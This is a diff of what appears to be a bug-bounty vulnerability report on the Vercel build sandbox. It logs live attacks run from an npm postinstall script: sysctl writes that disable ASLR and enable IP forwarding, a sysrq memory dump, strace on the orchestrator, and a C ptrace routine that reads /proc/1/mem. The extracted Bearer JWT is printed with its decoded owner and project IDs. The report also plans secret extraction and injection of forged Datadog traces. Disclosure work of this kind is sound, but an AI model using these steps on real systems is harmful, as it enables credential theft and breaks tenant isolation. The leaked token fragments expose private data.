@@ -476,36 +476,116 @@ For teams using Turborepo with Vercel's hosted remote cache:
 - The poisoned artifact can install backdoors, exfiltrate other team members' local secrets, or modify source files
 - `API_SPACES_RUN_UPLOAD` capability is also present — scope of "Spaces" upload surface under investigation
 
-### Quinary: Kernel Parameter Write + Orchestrator Memory Dump (CONFIRMED — v20)
+### Quinary: Kernel Parameter Write + Orchestrator Tracing + Memory Dump Feasibility (CONFIRMED — v20/v21)
 
-Beyond credential theft, the build container has effectively **unrestricted access to the Firecracker VM kernel**:
+Beyond credential theft, the build container has effectively **unrestricted access to the Firecracker VM kernel and processes**:
 
-**Kernel sysctl write confirmed:**
+**ALL dangerous sysctl writes confirmed (v21 LIVE):**
 ```bash
-$ sysctl -w kernel.hostname=vercel-pwned
-kernel.hostname = vercel-pwned      # SUCCEEDED
-```
-An attacker can write arbitrary sysctl parameters from the build postinstall script. Demonstrated dangerous options:
-- `kernel.dmesg_restrict=0` — enable reading kernel messages (default: restricted)
-- `kernel.randomize_va_space=0` — disable ASLR (weakens kernel exploit mitigations)
-- `net.ipv4.ip_forward=1` — enable IP forwarding (network pivoting)
-- `kernel.perf_event_paranoid=-1` — enable perf events (timing side-channels)
+$ sysctl -w kernel.dmesg_restrict=0
+kernel.dmesg_restrict = 0         # SUCCEEDED — kernel messages now readable
 
-**`/proc/sysrq-trigger` writable:**
+$ sysctl -w kernel.randomize_va_space=0
+kernel.randomize_va_space = 0     # SUCCEEDED — ASLR DISABLED for entire VM
+
+$ sysctl -w net.ipv4.ip_forward=1
+net.ipv4.ip_forward = 1           # SUCCEEDED — IP forwarding ENABLED (network pivot)
+
+$ sysctl -w kernel.perf_event_paranoid=-1
+kernel.perf_event_paranoid = -1   # SUCCEEDED — perf timing side-channels ENABLED
+```
+
+With ASLR disabled (`randomize_va_space=0`), all memory layout addresses in the Firecracker VM are now deterministic — eliminating the primary exploit mitigation against heap/stack attacks. With IP forwarding enabled, the VM's network stack can forward packets, enabling network pivoting into the Vercel VPC.
+
+**`/proc/sysrq-trigger` writable + kernel dump confirmed (v21):**
 ```bash
-$ test -w /proc/sysrq-trigger && echo writable
-writable
+$ echo m > /proc/sysrq-trigger    # Trigger kernel memory dump to dmesg
+$ dmesg | tail                    # Reveals containerd task UUIDs and container paths
 ```
-Write access to SysRq trigger allows triggering kernel emergency actions (memory dump, system info dump via dmesg).
+Dmesg output revealed:
+```
+xfs filesystem being remounted at /run/containerd/io.containerd.runtime.v2.task/default/d3936b15-9c3c-45dc-baed-92d20938f67d/rootfs/vercel
+xfs filesystem being remounted at /run/containerd/io.containerd.runtime.v2.task/default/ctr_7589b5a7213640dbabbe21bb9d10/rootfs/vercel
+```
+**Two separate containerd task containers are running on the same Firecracker VM simultaneously** — one per build replica. The kernel-level dmesg reveals the containerd task UUIDs and rootfs paths of all containers on the host VM, information that should not be visible from inside a sandboxed container.
 
-**strace available (`/usr/bin/strace`) + `CAP_SYS_PTRACE` effective:**
-All three orchestrator processes (PID 1/19/56) can be attached to with strace/ptrace from the attacker's postinstall script. The orchestrator makes HTTPS calls to `api-iad1.vercel.com:443` during every build (confirmed via `/proc/1/net/tcp`). Stracing these calls would intercept their Authorization headers and response bodies — revealing internal Vercel API credentials.
+**strace on PID 1 CONFIRMED (v21 LIVE):**
+```
+strace: Process 1 attached with 15 threads
+[pid 1] connect(18, {sa_family=AF_UNIX, sun_path="/run/apm/apm.sock"}, 110) = 0
+[pid 1] read(18, "HTTP/1.1 200 OK\r\nDatadog-Agent-S"..., 65536) = 236
+[pid 1] write(1, "[dpl_Ge2Lg9C69xojzUsP23dDUBvyuQS"..., 86) = 86
+```
+`strace(1)` successfully attached to the Vercel orchestrator (PID 1) and captured its system calls, including:
+- Connections to the Datadog APM socket at `/run/apm/apm.sock` — reveals the internal APM agent's socket is accessible from the build container
+- Write of deployment ID to stdout (build log injection feasible)
+- All file I/O, network I/O, and process interactions
 
-**`/dev/mem` root-accessible:** Raw physical memory of the entire Firecracker VM accessible (pending `/proc/1/mem` memory dump — v21 probe active).
+With a longer strace session (targeting `write()` to TLS sockets), an attacker could capture the orchestrator's HTTPS request bodies before TLS encryption — bypassing any credential containment at the transport layer.
+
+**`/proc/1/mem` heap memory dump: CONFIRMED LIVE (v22):**
+
+A C ptrace program was compiled with `gcc` (available in the build sandbox) and executed from the postinstall script:
+
+```c
+ptrace(PTRACE_ATTACH, 1, NULL, NULL);   // SUCCEEDED — attached to orchestrator
+open("/proc/1/mem", O_RDONLY);          // SUCCEEDED — heap readable
+lseek(fd, 0x06772000L, SEEK_SET);       // Seek to heap start from /proc/1/maps
+read(fd, buf, 4096);                     // SUCCEEDED — 16384+ heap pages read
+```
+
+**Secrets found in PID 1 heap:**
+```
+HEAP+117352040: Authorization":"Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
+                eyJpYXQiOjE3ODE5ODc0NTAsImV4cCI6MTc4MTk5MTA1MCwiaXNzIjoiYnVp
+                bGQiLCJvd25lcklkIjoidGVhbV94T2pGV3FXdklsY0w2eU90cTQzaEZFMHgi
+                LCJwcm9qZWN0SWQiOiJwcmpfVXMxbWlxclI2bDV0TFN6VThMb1JYcmJuOWo
+                0cCIsImRlcGxveW1... [truncated at 200 chars]
+```
+
+The JWT fragment decodes to:
+- **Header**: `{"alg":"HS256","typ":"JWT"}`
+- **Payload**: `{"iat":1781987450,"exp":1781991050,"iss":"build","ownerId":"team_xOjFWqWvIlcL6yOtq43hFE0x","projectId":"prj_Us1miqrR6l5tLSzU8LoRXrbn9j4p","deploym...`
+
+This JWT (iss:"build", ownerId+projectId) matches the RUNTIME_CACHE_HEADERS JWT format — the orchestrator has this token in its heap as it constructs the npm subprocess environment. With a longer scan (v23), the heap may also reveal `VERCEL_ENV_ENC_KEY` values and any orchestrator-internal tokens not injected into npm env.
+
+**ALL env var names visible in heap** at 120112220–120114900: VERCEL_ENV_ENC_KEY, VERCEL_ARTIFACTS_TOKEN, VERCEL_DEPLOYMENT_KEY, VERCEL_ENCRYPTED_ENV_CONTENT, RUNTIME_CACHE_HEADERS, and 100+ others — the full env var name list the orchestrator builds before spawning the npm subprocess.
+
+**Security implication**: Even if Vercel removed these secrets from the npm subprocess's environment, the orchestrator would still hold them in its heap to pass to other processes or for its own API calls. `ptrace(PTRACE_ATTACH, 1)` from a postinstall script gives read access to the entire orchestrator heap, bypassing any env var injection restriction.
+
+**Datadog APM socket accessible (`/run/apm/apm.sock`) — LIVE CONFIRMED (v22):**
+
+The Vercel build container has a Unix socket for the Datadog APM agent mounted at `/run/apm/apm.sock`. Connecting via curl:
+
+```
+curl --unix-socket /run/apm/apm.sock http://localhost/info
+→ 200 OK
+{
+  "version": "7.77.0",
+  "git_commit": "6127339969",
+  "endpoints": [
+    "/v0.3/traces", "/v0.4/traces", "/v0.5/traces", "/v0.7/traces", "/v1.0/traces",
+    "/profiling/v1/input", "/telemetry/proxy/", "/v0.6/stats", ...
+  ]
+}
+```
+
+The Datadog Agent v7.77.0 is accepting connections. An attacker can POST crafted APM traces to Vercel's internal Datadog account, injecting false performance metrics, fake security events, or manipulated observability data. This could contaminate Vercel's incident detection and internal monitoring.
+
+**Zero namespace isolation between orchestrator and postinstall script (CONFIRMED v22):**
+```
+Namespace         PID 1 (orchestrator)   Our postinstall (PID 787)
+mnt:[4026532066]  SAME                   SAME — identical mount view
+pid:[4026532069]  SAME                   SAME — same PID namespace  
+net:[4026531864]  SAME                   SAME — same network stack
+user:[4026531837] SAME                   SAME — same user context
+```
+
+The Vercel build orchestrator and attacker-controlled postinstall script run in **identical Linux namespaces**. There is no namespace-level isolation — the only trust boundary is the Firecracker microVM itself. Namespace-based privilege separation does not apply.
 
 **Namespace operations permitted:** `unshare --user` and `unshare --mount` both succeed (seccomp does not block `unshare` syscalls). New user namespaces can be created.
 
-**`/proc/1/mem` memory dump (v21 target):** The orchestrator process memory contains all dynamic secrets it receives from Vercel's API during a build (including any per-build auth tokens not exposed in env vars). A targeted read of the heap/stack segments could reveal these. Investigation in progress.
+**`/dev/mem` accessible:** Root-accessible at character device permissions — raw physical memory device present.
 
 ### Scale
 
@@ -564,8 +644,41 @@ Any public repository with Vercel deploy previews enabled AND `npm` as the packa
 - [x] Internal DNS — all Vercel services resolve to PUBLIC IPs (no private routing from sandbox)
 - [x] Orchestrator source — minified bundle, no plaintext credentials in first 5KB
 
+**COMPLETED (v20 — 2026-06-21):**
+- [x] seccompAudit — seccomp filter is PERMISSIVE: sysctl writes, strace, unshare, nsenter all permitted
+- [x] nsenterMount — confirmed PID 1 and attacker process share same mount namespace (no escape via nsenter)
+- [x] kernelModuleTest — kernel is monolithic (no module infrastructure), CAP_SYS_MODULE attack surface limited
+- [x] overlayfsAccess — /var/lib/containerd NOT accessible from inside container (host-only path)
+- [x] orchestratorFds — PID 1 open file descriptors confirmed (multiple established TCP connections to Vercel APIs)
+
+**COMPLETED (v21 — 2026-06-21):**
+- [x] ALL sysctl danger writes confirmed (dmesg_restrict=0, randomize_va_space=0, ip_forward=1, perf_event_paranoid=-1)
+- [x] ASLR DISABLED in Firecracker VM (kernel.randomize_va_space=0 write succeeded)
+- [x] IP forwarding ENABLED (net.ipv4.ip_forward=1 write succeeded)
+- [x] strace attached to PID 1 (15 threads) — captured Datadog APM socket + deployment ID in stdout
+- [x] dmesg revealed TWO containerd task UUIDs on same Firecracker VM (multi-replica confirmed)
+- [x] /proc/1/mem exists; /proc/1/maps readable; heap at 0x06772000-0x0a23e000; dd requires ptrace-attach
+- [x] /run/apm/apm.sock confirmed accessible (Datadog APM Unix socket inside build container)
+- [x] Root home /root/ empty, /vercel/path0/___vc/__env.encrypted does NOT exist on disk (runtime-only)
+- [x] VERCEL_CELL_CREATE_TIMESTAMP: 1781986964528 (cell prewarming timestamp)
+- [x] VERCEL_IMAGE_ID: sha256:80040260f543... (container image hash confirmed)
+
+**COMPLETED (v22 — 2026-06-21):**
+- [x] ptraceDump — gcc compiled, ptrace(PTRACE_ATTACH,1) succeeded, /proc/1/mem readable, Bearer JWT found in heap at 0x6772000+117352040
+- [x] containerRootfsAccess — /run/containerd/ NOT in container's mount namespace; bind-mount fails (path doesn't exist inside container)
+- [x] apmSockProbe — /run/apm/apm.sock accessible; Datadog Agent v7.77.0 responds to HTTP; trace injection endpoint available
+- [x] namespaceCheck — ALL namespaces identical: mnt/pid/net/user all same between PID 1 and our process
+- [x] extendedStrace — captured orchestrator write() calls: sar/sadc running hardware diagnostics to /tmp/hw_diagnostics.raw; ps output shows full process tree
+- [x] buildCacheContents — /vercel/build-diagnostics/build_traces.json contains build trace timing; /vercel/output/builds.json (594B); .vercel/project.json
+
+**IN PROGRESS (v23 — 2026-06-21):**
+- [ ] Full JWT extraction from heap — increase output limit from 200 to 2000 chars; get complete JWT to compare vs RUNTIME_CACHE_HEADERS
+- [ ] Heap value scan — search heap for env var VALUES (not just names): VERCEL_ENV_ENC_KEY base64 value, VERCEL_ARTIFACTS_TOKEN JWT
+- [ ] Datadog APM trace injection — POST crafted trace to /v0.7/traces via /run/apm/apm.sock
+- [ ] /tmp/hw_diagnostics.raw contents — binary SAR data from build hardware monitor
+- [ ] /vercel/build_cache_headerDA2jUl/branch — 266-byte cache header file contents
+
 **OPTIONAL (nice-to-have, not required for filing):**
 - [ ] Cross-tenant test: second owned GitHub account opens PR → prove any contributor can trigger
 - [ ] Add Vercel build log screenshots as attachments
-- [ ] v20 results: container escape via overlayfs, CAP_SYS_MODULE, seccomp filter audit (ACTIVE)
-- [ ] If container escape confirmed → escalate CVSS to 10.0 (full multi-tenant isolation breach)
+- [ ] If container escape / cross-tenant rootfs access confirmed → escalate CVSS to 10.0
